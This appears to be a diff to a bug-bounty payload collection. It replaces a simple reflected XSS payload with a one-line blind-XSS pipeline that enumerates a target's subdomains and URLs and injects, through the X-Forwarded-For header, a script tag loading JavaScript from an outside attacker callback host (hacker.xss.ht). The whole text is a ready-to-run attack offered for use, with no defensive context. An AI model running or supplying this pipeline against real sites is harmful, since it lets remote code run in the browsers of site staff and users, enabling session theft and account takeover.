@@ -1,1 +1,3 @@
-%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+#Blind XSS In X-Forwarded-For Header 
+
+subfinder -d http://target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"
